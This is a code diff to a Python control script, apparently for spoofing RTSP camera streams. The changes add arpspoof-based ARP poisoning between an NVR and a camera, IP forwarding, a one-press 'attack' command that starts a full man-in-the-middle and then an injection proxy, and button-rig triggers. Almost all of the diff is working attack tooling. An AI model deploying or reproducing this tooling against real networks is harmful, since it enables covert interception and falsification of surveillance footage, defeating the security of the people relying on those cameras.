@@ -9,8 +9,14 @@ Subcommands:
     spoof    start the proxy with the saved [proxy] args (idempotent)
     normal   stop the proxy — traffic goes back to whatever it was
     toggle   flip whichever state we're currently in
-    status   print whether the proxy is running (+ pid, uptime)
+    arpspoof on|off|toggle — ARP-poison the NVR⇄camera pair (+ ip_forward)
+    attack   full MITM in one shot: arpspoof on, then spoof
+    panic    stop everything: proxy off + arpspoof off + ip_forward restored
+    status   print whether the proxy / arpspoof are running (+ pid, uptime)
     logs     show (or tail with -f) the proxy's stdout/stderr
+
+These are the words the ESP32 button rig emits over serial; the serial
+bridge (trigger-serial.sh) maps each pressed word to one of them.
 
 State lives in two files you set in config.ini:
 
@@ -32,6 +38,7 @@ from __future__ import annotations
 import argparse
 import configparser
 import os
+import shutil
 import signal
 import subprocess
 import sys
@@ -41,6 +48,7 @@ from pathlib import Path
 
 HERE = Path(__file__).resolve().parent
 DEFAULT_CONFIG = HERE / "config.ini"
+IP_FORWARD = Path("/proc/sys/net/ipv4/ip_forward")
 
 
 # ---- small helpers --------------------------------------------------------
@@ -73,6 +81,13 @@ def pid_file(cp: configparser.ConfigParser) -> Path:
 def log_file(cp: configparser.ConfigParser) -> Path:
     return Path(cp.get("runtime", "log_file",
                        fallback="/tmp/rtspoof-ctl.log")).expanduser()
+
+
+def arp_pid_file(cp: configparser.ConfigParser) -> Path:
+    # Holds one PID per line (arpspoof runs as a pair of processes). A
+    # sibling `.ipfwd` file remembers ip_forward's pre-attack value.
+    return Path(cp.get("runtime", "arp_pid_file",
+                       fallback="/tmp/rtspoof-arp.pid")).expanduser()
 
 
 # ---- PID / liveness bookkeeping ------------------------------------------
@@ -119,6 +134,209 @@ def write_pid(cp: configparser.ConfigParser, pid: int) -> None:
     pf = pid_file(cp)
     pf.parent.mkdir(parents=True, exist_ok=True)
     pf.write_text(str(pid))
+
+
+# ---- arpspoof bookkeeping -------------------------------------------------
+#
+# arpspoof runs as two long-lived processes (NVR→camera and camera→NVR).
+# We track both PIDs, one per line, in arp_pid_file. ip_forward has to be
+# on for the MITM to forward traffic transparently; we flip it on and
+# stash the prior value in a sibling `.ipfwd` file so `off`/`panic` can
+# put it back exactly as we found it.
+
+def _read_pids(path: Path) -> list[int]:
+    try:
+        return [int(x) for x in path.read_text().split() if x.strip()]
+    except (FileNotFoundError, ValueError, OSError):
+        return []
+
+
+def arp_running_pids(cp: configparser.ConfigParser) -> list[int]:
+    """Live arpspoof PIDs, rewriting (or clearing) the pid file as needed."""
+    pf = arp_pid_file(cp)
+    alive = [p for p in _read_pids(pf) if is_alive(p)]
+    if alive:
+        pf.write_text("\n".join(str(p) for p in alive))
+    else:
+        try:
+            pf.unlink()
+        except FileNotFoundError:
+            pass
+    return alive
+
+
+def _ipfwd_sidecar(cp: configparser.ConfigParser) -> Path:
+    return arp_pid_file(cp).with_suffix(".ipfwd")
+
+
+def _enable_ip_forward(cp: configparser.ConfigParser) -> None:
+    try:
+        prev = IP_FORWARD.read_text().strip()
+    except OSError:
+        prev = ""
+    if prev == "1":
+        return  # already on — nothing to remember, nothing to restore
+    try:
+        side = _ipfwd_sidecar(cp)
+        side.parent.mkdir(parents=True, exist_ok=True)
+        side.write_text(prev)          # remember so we can put it back
+        IP_FORWARD.write_text("1\n")
+    except PermissionError:
+        die("need root to enable ip_forward — run with sudo")
+    except OSError as e:
+        die(f"could not enable ip_forward: {e}")
+
+
+def _restore_ip_forward(cp: configparser.ConfigParser) -> None:
+    side = _ipfwd_sidecar(cp)
+    try:
+        prev = side.read_text().strip()
+    except OSError:
+        return  # we never touched it (it was already on, or never started)
+    try:
+        IP_FORWARD.write_text((prev or "0") + "\n")
+    except OSError:
+        pass
+    try:
+        side.unlink()
+    except FileNotFoundError:
+        pass
+
+
+def _arp_binary(cp: configparser.ConfigParser, config_dir: Path) -> str:
+    sect = cp["arpspoof"] if "arpspoof" in cp else {}
+    binary = (sect.get("binary", "") or "").strip() or "arpspoof"
+    if os.sep in binary:
+        bp = resolve_rel(config_dir, binary)
+        if not bp.exists():
+            die(f"arpspoof binary not found: {bp}")
+        return str(bp)
+    if shutil.which(binary) is None:
+        die("arpspoof not found in PATH (install dsniff) "
+            "or set [arpspoof].binary to a full path")
+    return binary
+
+
+def _arpspoof_off(cp: configparser.ConfigParser) -> int:
+    pids = arp_running_pids(cp)
+    if not pids:
+        _restore_ip_forward(cp)
+        print("arpspoof already off")
+        return 0
+    # SIGTERM lets arpspoof send its corrective ARP replies so the real
+    # MACs are restored on both victims before it exits.
+    for p in pids:
+        try:
+            os.kill(p, signal.SIGTERM)
+        except ProcessLookupError:
+            pass
+    for _ in range(30):
+        if not any(is_alive(p) for p in pids):
+            break
+        time.sleep(0.1)
+    for p in pids:
+        if is_alive(p):
+            try:
+                os.kill(p, signal.SIGKILL)
+            except ProcessLookupError:
+                pass
+    try:
+        arp_pid_file(cp).unlink()
+    except FileNotFoundError:
+        pass
+    _restore_ip_forward(cp)
+    try:
+        with open(log_file(cp), "a") as log:
+            log.write(f"--- arpspoof off (stopped {','.join(map(str, pids))}) "
+                      f"{_now()} ---\n")
+    except OSError:
+        pass
+    print(f"arpspoof stopped (pids={','.join(map(str, pids))})")
+    return 0
+
+
+def _arpspoof_on(cp: configparser.ConfigParser, config_dir: Path) -> int:
+    alive = arp_running_pids(cp)
+    if alive:
+        print(f"already arpspoofing (pids={','.join(map(str, alive))})")
+        return 0
+    if "arpspoof" not in cp:
+        die("config missing [arpspoof] section (iface/nvr_ip/camera_ip)")
+    sect = cp["arpspoof"]
+    iface = sect.get("iface", "").strip()
+    nvr = sect.get("nvr_ip", "").strip()
+    cam = sect.get("camera_ip", "").strip()
+    if not (iface and nvr and cam):
+        die("config [arpspoof] needs iface, nvr_ip and camera_ip")
+    binary = _arp_binary(cp, config_dir)
+
+    _enable_ip_forward(cp)
+
+    lf = log_file(cp)
+    lf.parent.mkdir(parents=True, exist_ok=True)
+    log = open(lf, "a", buffering=1)
+    log.write(f"\n--- arpspoof on {_now()} ---\n")
+
+    pids: list[int] = []
+    for target, host in ((nvr, cam), (cam, nvr)):
+        argv = [binary, "-i", iface, "-t", target, host]
+        log.write("argv: " + " ".join(_quote(a) for a in argv) + "\n")
+        log.flush()
+        try:
+            proc = subprocess.Popen(
+                argv, stdin=subprocess.DEVNULL, stdout=log, stderr=log,
+                start_new_session=True, close_fds=True,
+            )
+        except OSError as e:
+            for p in pids:          # roll back any half-started pair
+                try:
+                    os.kill(p, signal.SIGTERM)
+                except ProcessLookupError:
+                    pass
+            _restore_ip_forward(cp)
+            die(f"arpspoof spawn failed: {e}")
+        pids.append(proc.pid)
+
+    time.sleep(0.3)
+    live = [p for p in pids if is_alive(p)]
+    if not live:
+        _restore_ip_forward(cp)
+        tail = ""
+        try:
+            tail = _tail_lines(lf, 10)
+        except OSError:
+            pass
+        die(f"arpspoof exited immediately — check iface/IPs and that you're "
+            f"root.\nLast log lines:\n{tail}", code=1)
+
+    arp_pid_file(cp).parent.mkdir(parents=True, exist_ok=True)
+    arp_pid_file(cp).write_text("\n".join(str(p) for p in live))
+    print(f"arpspoofing {nvr} ⇄ {cam} on {iface} · pids={','.join(map(str, live))}")
+    return 0
+
+
+def cmd_arpspoof(cp: configparser.ConfigParser, config_dir: Path,
+                 state: str) -> int:
+    if state == "toggle":
+        state = "off" if arp_running_pids(cp) else "on"
+    if state == "off":
+        return _arpspoof_off(cp)
+    return _arpspoof_on(cp, config_dir)
+
+
+def cmd_attack(cp: configparser.ConfigParser, config_dir: Path) -> int:
+    """Full MITM in one press: poison the ARP pair, then start injecting."""
+    rc = _arpspoof_on(cp, config_dir)
+    if rc != 0:
+        return rc
+    return cmd_spoof(cp, config_dir)
+
+
+def cmd_panic(cp: configparser.ConfigParser, config_dir: Path) -> int:
+    """Everything off, host left as we found it. Safe to spam."""
+    rc_proxy = cmd_normal(cp, config_dir)
+    rc_arp = _arpspoof_off(cp)
+    return rc_proxy or rc_arp
 
 
 # ---- argv construction ----------------------------------------------------
@@ -280,16 +498,25 @@ def cmd_toggle(cp: configparser.ConfigParser, config_dir: Path) -> int:
 
 def cmd_status(cp: configparser.ConfigParser, config_dir: Path) -> int:
     pid = running_pid(cp)
+    arp = arp_running_pids(cp)
+
     if pid is None:
-        print("state: normal (proxy not running)")
-        return 1   # non-zero so shell callers can branch on it
-    uptime = _proc_uptime(pid)
-    msg = f"state: spoofing · pid={pid}"
-    if uptime is not None:
-        msg += f" · up {_fmt_duration(uptime)}"
-    msg += f" · log={log_file(cp)}"
-    print(msg)
-    return 0
+        print("proxy:    normal (not running)")
+    else:
+        msg = f"proxy:    spoofing · pid={pid}"
+        uptime = _proc_uptime(pid)
+        if uptime is not None:
+            msg += f" · up {_fmt_duration(uptime)}"
+        print(msg)
+
+    if arp:
+        print(f"arpspoof: on · pids={','.join(map(str, arp))}")
+    else:
+        print("arpspoof: off")
+
+    print(f"log:      {log_file(cp)}")
+    # non-zero when fully idle, so shell callers can branch on "is anything on?"
+    return 0 if (pid is not None or arp) else 1
 
 
 def cmd_logs(cp: configparser.ConfigParser, args: argparse.Namespace) -> int:
@@ -368,11 +595,19 @@ def main(argv: list[str] | None = None) -> int:
     ap.add_argument("-c", "--config", default=str(DEFAULT_CONFIG),
                     help=f"config file (default: {DEFAULT_CONFIG})")
 
-    sub = ap.add_subparsers(dest="cmd", required=True, metavar="{spoof,normal,toggle,status,logs}")
+    sub = ap.add_subparsers(
+        dest="cmd", required=True,
+        metavar="{spoof,normal,toggle,arpspoof,attack,panic,status,logs}")
     sub.add_parser("spoof",  help="start the proxy with the saved inject args")
     sub.add_parser("normal", help="stop the proxy — traffic goes back to normal")
     sub.add_parser("toggle", help="flip between spoof and normal")
-    sub.add_parser("status", help="print whether the proxy is running")
+    p_arp = sub.add_parser("arpspoof",
+                           help="ARP-poison the NVR⇄camera pair (+ ip_forward)")
+    p_arp.add_argument("state", nargs="?", choices=["on", "off", "toggle"],
+                       default="on", help="default: on")
+    sub.add_parser("attack", help="full MITM: arpspoof on, then spoof")
+    sub.add_parser("panic",  help="stop everything and restore the host")
+    sub.add_parser("status", help="print whether the proxy / arpspoof are running")
     p_logs = sub.add_parser("logs", help="show recent proxy output")
     p_logs.add_argument("-n", type=int, default=50, help="lines to show (default 50)")
     p_logs.add_argument("-f", "--follow", action="store_true", help="tail -f mode")
@@ -383,11 +618,14 @@ def main(argv: list[str] | None = None) -> int:
     config_dir = config_path.parent
     cp = load_config(config_path)
 
-    if args.cmd == "spoof":  return cmd_spoof(cp, config_dir)
-    if args.cmd == "normal": return cmd_normal(cp, config_dir)
-    if args.cmd == "toggle": return cmd_toggle(cp, config_dir)
-    if args.cmd == "status": return cmd_status(cp, config_dir)
-    if args.cmd == "logs":   return cmd_logs(cp, args)
+    if args.cmd == "spoof":    return cmd_spoof(cp, config_dir)
+    if args.cmd == "normal":   return cmd_normal(cp, config_dir)
+    if args.cmd == "toggle":   return cmd_toggle(cp, config_dir)
+    if args.cmd == "arpspoof": return cmd_arpspoof(cp, config_dir, args.state)
+    if args.cmd == "attack":   return cmd_attack(cp, config_dir)
+    if args.cmd == "panic":    return cmd_panic(cp, config_dir)
+    if args.cmd == "status":   return cmd_status(cp, config_dir)
+    if args.cmd == "logs":     return cmd_logs(cp, args)
     die(f"unknown subcommand: {args.cmd}")  # pragma: no cover
 
 
